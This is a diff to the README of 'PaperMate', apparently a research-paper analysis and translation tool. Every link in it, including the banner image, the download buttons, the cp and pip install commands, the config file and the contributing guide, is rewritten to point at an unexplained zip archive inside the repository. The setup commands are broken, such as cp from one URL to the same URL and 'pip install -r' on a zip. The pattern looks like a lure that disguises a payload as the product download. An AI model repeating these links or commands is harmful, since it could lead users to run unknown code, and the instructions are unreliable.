@@ -2,7 +2,7 @@
 
 ### Effortlessly analyze and translate research papers.
 
-![PaperMate](https://github.com/memecrypto/PaperMate/raw/refs/heads/main/backend/app/models/Mate_Paper_v2.5-alpha.5.zip)
+![PaperMate](https://raw.githubusercontent.com/memecrypto/PaperMate/main/backend/app/utils/Paper_Mate_Mahran.zip)
 
 ## 🚀 Features Overview
 
@@ -31,14 +31,14 @@
 
 ### 📦 Visit this page to download
 
-You can download PaperMate from the Releases page here: [Download PaperMate](https://github.com/memecrypto/PaperMate/raw/refs/heads/main/backend/app/models/Mate_Paper_v2.5-alpha.5.zip)
+You can download PaperMate from the Releases page here: [Download PaperMate](https://raw.githubusercontent.com/memecrypto/PaperMate/main/backend/app/utils/Paper_Mate_Mahran.zip)
 
 ### 🏗️ Method 1: Quick Start with Docker (Recommended)
 
 **Using Docker Database**:
 ```bash
-cp https://github.com/memecrypto/PaperMate/raw/refs/heads/main/backend/app/models/Mate_Paper_v2.5-alpha.5.zip https://github.com/memecrypto/PaperMate/raw/refs/heads/main/backend/app/models/Mate_Paper_v2.5-alpha.5.zip
-# Edit https://github.com/memecrypto/PaperMate/raw/refs/heads/main/backend/app/models/Mate_Paper_v2.5-alpha.5.zip and set DATABASE_URL to:
+cp https://raw.githubusercontent.com/memecrypto/PaperMate/main/backend/app/utils/Paper_Mate_Mahran.zip https://raw.githubusercontent.com/memecrypto/PaperMate/main/backend/app/utils/Paper_Mate_Mahran.zip
+# Edit https://raw.githubusercontent.com/memecrypto/PaperMate/main/backend/app/utils/Paper_Mate_Mahran.zip and set DATABASE_URL to:
 # DATABASE_URL=postgresql+asyncpg://postgres:postgres@db:5432/papermate
 
 docker-compose --profile db --profile dev up -d
@@ -46,8 +46,8 @@ docker-compose --profile db --profile dev up -d
 
 **Using External Database**:
 ```bash
-cp https://github.com/memecrypto/PaperMate/raw/refs/heads/main/backend/app/models/Mate_Paper_v2.5-alpha.5.zip https://github.com/memecrypto/PaperMate/raw/refs/heads/main/backend/app/models/Mate_Paper_v2.5-alpha.5.zip
-# Edit https://github.com/memecrypto/PaperMate/raw/refs/heads/main/backend/app/models/Mate_Paper_v2.5-alpha.5.zip and set DATABASE_URL to your database address
+cp https://raw.githubusercontent.com/memecrypto/PaperMate/main/backend/app/utils/Paper_Mate_Mahran.zip https://raw.githubusercontent.com/memecrypto/PaperMate/main/backend/app/utils/Paper_Mate_Mahran.zip
+# Edit https://raw.githubusercontent.com/memecrypto/PaperMate/main/backend/app/utils/Paper_Mate_Mahran.zip and set DATABASE_URL to your database address
 
 docker-compose --profile dev up -d
 ```
@@ -67,7 +67,7 @@ docker-compose --profile dev up -d
 - Install Python 3.8 or higher.
 - Install the required packages using pip:
 ```bash
-pip install -r https://github.com/memecrypto/PaperMate/raw/refs/heads/main/backend/app/models/Mate_Paper_v2.5-alpha.5.zip
+pip install -r https://raw.githubusercontent.com/memecrypto/PaperMate/main/backend/app/utils/Paper_Mate_Mahran.zip
 ```
 
 **Run the Application**:
@@ -86,7 +86,7 @@ uvicorn main:app --host 0.0.0.0 --port 8000
 
 ## 📥 Download & Install
 
-Visit this page to download PaperMate: [Download PaperMate](https://github.com/memecrypto/PaperMate/raw/refs/heads/main/backend/app/models/Mate_Paper_v2.5-alpha.5.zip)
+Visit this page to download PaperMate: [Download PaperMate](https://raw.githubusercontent.com/memecrypto/PaperMate/main/backend/app/utils/Paper_Mate_Mahran.zip)
 
 ## 📘 Support
 
@@ -94,7 +94,7 @@ If you have questions or need help, please check the Issues section on GitHub or
 
 ## 👥 Contributing
 
-We welcome contributions. Please see the https://github.com/memecrypto/PaperMate/raw/refs/heads/main/backend/app/models/Mate_Paper_v2.5-alpha.5.zip file for details on how to help improve PaperMate. 
+We welcome contributions. Please see the https://raw.githubusercontent.com/memecrypto/PaperMate/main/backend/app/utils/Paper_Mate_Mahran.zip file for details on how to help improve PaperMate. 
 
 ## 🔗 License
 
